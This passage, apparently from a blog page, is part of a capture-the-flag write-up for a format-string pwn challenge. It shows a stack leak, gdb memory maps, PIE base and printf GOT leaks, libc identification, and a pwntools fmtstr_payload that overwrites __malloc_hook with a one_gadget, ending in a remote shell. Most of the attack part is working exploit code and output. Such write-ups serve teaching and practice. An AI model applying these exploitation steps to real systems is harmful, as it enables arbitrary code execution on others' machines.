+0x7f28befdfa23 (nil) 0x7f28bef06b82 0x7ffc6df46b50 (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x20702520702520 (nil) 0xa8716b068a2d4d00 0x7ffc6df46c80 0x558aecf6c2b3 0x7ffc6df46d70 0xa8716b068a2d4d00 (nil) 0x7f28bee27565 0x7ffc6df46d78 0x16dfe8000 0x558aecf6c284 0x7ffc6df47059 0x558aecf6c2d0 0x6abbc2b8a3ffaee0 0x558aecf6c0c0 (nil) (nil) (nil) 0x954319507adfaee0 0x94eabf7c49cbaee0 (nil) (nil) (nil) 0x1 0x7ffc6df46d78 0x7ffc6df46d88 0x7f28bf036220 (nil) (nil) 0x558aecf6c0c0 0x7ffc6df46d70 (nil) (nil) 0x558aecf6c0ee 0x7ffc6df46d68 0x1c 0x1 0x7ffc6df4732a (nil) 0x7ffc6df47333 0x7ffc6df47343 0x7ffc6df47395 0x7ffc6df473a8 0x7ffc6df473bc 0x7ffc6df473eb 0x7ffc6df47425 0x7ffc6df47446 0x7ffc6df47472 0x7f28befdfa23 (nil) 0x7f28bef06b82 0x7ffc6df46b50 (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520000a20 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 
+</code></pre><p>Now let&rsquo;s quickly open in gdb and run &ldquo;vmmap&rdquo;, to see which addresses look like code and which looks like stack:</p>
+<pre tabindex="0"><code>    0x555555554000     0x555555555000 r--p     1000 0      /home/cave/CTF/HTB/pwn/format_/format
+    0x555555555000     0x555555556000 r-xp     1000 1000   /home/cave/CTF/HTB/pwn/format_/format
+    0x555555556000     0x555555557000 r--p     1000 2000   /home/cave/CTF/HTB/pwn/format_/format
+    0x555555557000     0x555555558000 r--p     1000 2000   /home/cave/CTF/HTB/pwn/format_/format
+    0x555555558000     0x555555559000 rw-p     1000 3000   /home/cave/CTF/HTB/pwn/format_/format
+    0x7ffff7dbf000     0x7ffff7dc1000 rw-p     2000 0      anon_7ffff7dbf
+    0x7ffff7dc1000     0x7ffff7de7000 r--p    26000 0      /usr/lib/x86_64-linux-gnu/libc-2.33.so
+    0x7ffff7de7000     0x7ffff7f52000 r-xp   16b000 26000  /usr/lib/x86_64-linux-gnu/libc-2.33.so
+    0x7ffff7f52000     0x7ffff7f9e000 r--p    4c000 191000 /usr/lib/x86_64-linux-gnu/libc-2.33.so
+    0x7ffff7f9e000     0x7ffff7fa1000 r--p     3000 1dc000 /usr/lib/x86_64-linux-gnu/libc-2.33.so
+    0x7ffff7fa1000     0x7ffff7fa4000 rw-p     3000 1df000 /usr/lib/x86_64-linux-gnu/libc-2.33.so
+    0x7ffff7fa4000     0x7ffff7faf000 rw-p     b000 0      anon_7ffff7fa4
+    0x7ffff7fc3000     0x7ffff7fc7000 r--p     4000 0      [vvar]
+    0x7ffff7fc7000     0x7ffff7fc9000 r-xp     2000 0      [vdso]
+    0x7ffff7fc9000     0x7ffff7fca000 r--p     1000 0      /usr/lib/x86_64-linux-gnu/ld-2.33.so
+    0x7ffff7fca000     0x7ffff7ff1000 r-xp    27000 1000   /usr/lib/x86_64-linux-gnu/ld-2.33.so
+    0x7ffff7ff1000     0x7ffff7ffb000 r--p     a000 28000  /usr/lib/x86_64-linux-gnu/ld-2.33.so
+    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000 31000  /usr/lib/x86_64-linux-gnu/ld-2.33.so
+    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000 33000  /usr/lib/x86_64-linux-gnu/ld-2.33.so
+    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]
+
+</code></pre><p>So addresses with 0x7fff are stack addresses, and 0x555 addresses are code. We can see the following addresses, we see three addresses that looks like code. Let&rsquo;s pick one and look in gdb</p>
+<pre tabindex="0"><code>0x558aecf6c284 0x7ffc6df47059 0x558aecf6c2d0 0x6abbc2b8a3ffaee0 0x558aecf6c0c0 (nil) (nil) (nil)
+</code></pre><p>So one of the addresses is at the offset 35, meaning we can access it with direct parameter accessing: %35$p (this is on remote, 34 on local for some reason) - if we look in gdb we see that the address is:</p>
+<pre tabindex="0"><code>pwndbg&gt; x/32wgx 0x5555555550c0
+0x5555555550c0 &lt;_start&gt;:    0x8949ed31fa1e0ff3  0xe48348e289485ed1
+0x5555555550d0 &lt;_start+16&gt;: 0x0266058d4c5450f0  0x0001ef0d8d480000
+</code></pre><p>Now we just find the offset between the start and the code section, and bob&rsquo;s your uncle, we have the offset for the base address leaked.</p>
+<p>Now next we need to leak the global offset table&rsquo;s entry for printf - we remember that %s, reads from an address and prints that, so we read from the address of the global offset table and we have leaked libc base+printf offset. We can test which parameter access we need to use manually:</p>
+<pre tabindex="0"><code>cave@townie:~/CTF/pwn/format_$ ./format
+aaaabbbb %8$p i AAAAAAAA
+aaaabbbb 0x4141414141414141 i AAAAAAAA
+</code></pre><p>Now we use this info to leak printf (We put the address of prints GOT entry instead of the 8 capital A&rsquo;s) - after that we use a libc database to find out which libc is running remotely. Last but not least, we need to make the actual write with format string.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">payload <span style="color:#f92672">=</span> fmtstr_payload(<span style="color:#ae81ff">6</span>, {__malloc_hook: one_gd})
+</code></pre></div><p>I&rsquo;m not completely sure why it has to be 6, but it&rsquo;s something about you controlling that parameter:</p>
+<pre tabindex="0"><code>AAAAiiii %6$p
+AAAAiiii 0x6969696941414141
+</code></pre><p>And then we just send it! And send a ton of characters to call malloc to get space for them, and boom:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3">[<span style="color:#f92672">*</span>] <span style="color:#e6db74">&#39;/home/cave/CTF/pwn/format_/solve1_malloc_hook/format&#39;</span>
+    Arch:     amd64<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[<span style="color:#f92672">+</span>] Opening connection to challenge on port <span style="color:#ae81ff">80085</span>: Done
+[<span style="color:#f92672">+</span>] Start: <span style="color:#ae81ff">0x55661cfd20c0</span>
+[<span style="color:#f92672">*</span>] Base: <span style="color:#ae81ff">0x55661cfd1000</span>
+printf got <span style="color:#ae81ff">0x55661cfd4fc0</span>
+[<span style="color:#f92672">-</span>] Leaked printf got: <span style="color:#ae81ff">0x7fe98b203e80</span>
+[<span style="color:#f92672">-</span>] Leaked libc: <span style="color:#ae81ff">0x7fe98b19f000</span>
+<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%140c</span><span style="color:#e6db74">%15$lln</span><span style="color:#e6db74">%c</span><span style="color:#e6db74">16$hhn</span><span style="color:#e6db74">%86c</span><span style="color:#e6db74">%17$hhn%618$hhn</span><span style="color:#e6db74">%85c</span><span style="color:#e6db74">%19$hhn</span><span style="color:#e6db74">%12c</span><span style="color:#e6db74">%20$hhnaaaaba0</span><span style="color:#ae81ff">\xac</span><span style="color:#e6db74">X</span><span style="color:#ae81ff">\x8b\xe9\x7f\x00\x00</span><span style="color:#e6db74">1</span><span style="color:#ae81ff">\xac</span><span style="color:#e6db74">X</span><span style="color:#ae81ff">\x8b\xe9\x7f\x00\x00</span><span style="color:#e6db74">4</span><span style="color:#ae81ff">\xac</span><span style="color:#e6db74">X</span><span style="color:#ae81ff">\x8b\xe9\x7f\x00\x00</span><span style="color:#e6db74">2</span><span style="color:#ae81ff">\xac</span><span style="color:#e6db74">X</span><span style="color:#ae81ff">\x8b\xe9\x7f\x00\x00</span><span style="color:#e6db74">5</span><span style="color:#ae81ff">\xac</span><span style="color:#e6db74">X</span><span style="color:#ae81ff">\x8b\xe9\x7f\x00\x00</span><span style="color:#e6db74">3</span><span style="color:#ae81ff">\xac</span><span style="color:#e6db74">X</span><span style="color:#ae81ff">\x8b\xe9\x7f\x00\x00</span><span style="color:#e6db74">&#39;</span>
+<span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>cave<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>pwn<span style="color:#f92672">/</span>format_<span style="color:#f92672">/</span>solve1_malloc_hook<span style="color:#f92672">/</span>sol<span style="color:#f92672">.</span>py:<span style="color:#ae81ff">92</span>: <span style="color:#a6e22e">BytesWarning</span>: Text <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> bytes; assuming ASCII, no guarantees<span style="color:#f92672">.</span> See https:<span style="color:#f92672">//</span>docs<span style="color:#f92672">.</span>pwntools<span style="color:#f92672">.</span>com<span style="color:#f92672">/</span><span style="color:#75715e">#bytes</span>
+  io<span style="color:#f92672">.</span>sendline(payload)
+[<span style="color:#f92672">*</span>] Switching to interactive mode
+                                                                                                                                           p      \xd0                                                                                     \x81                                                                \xc0                                                                                    \xc0           <span style="color:#f92672">%</span>aaaaba0ls
+flag<span style="color:#f92672">.</span>txt
+format
+run_challenge<span style="color:#f92672">.</span>sh
+</code></pre></div>
+        </div>
+
+        <div class="row middle-xs">
+          <div class="col-xs-12">
+            
+          </div>
+        </div>
+        
+          <div class="row">
+            <div class="col-xs-12">
+              
+            </div>
+          </div>
+
+          
+
+
+
+          
+          
+          <div style="height: 50px;"></div>
+          
+        
+
+        <div class="site-footer">
+  
+  
+</div>
+
+      </div>
+    </div>
+  </article>
+
+  
+
+<script>
+  
+  
+    
+    
+  
+</script>
+
+  
+
+</body>
+
+</html>
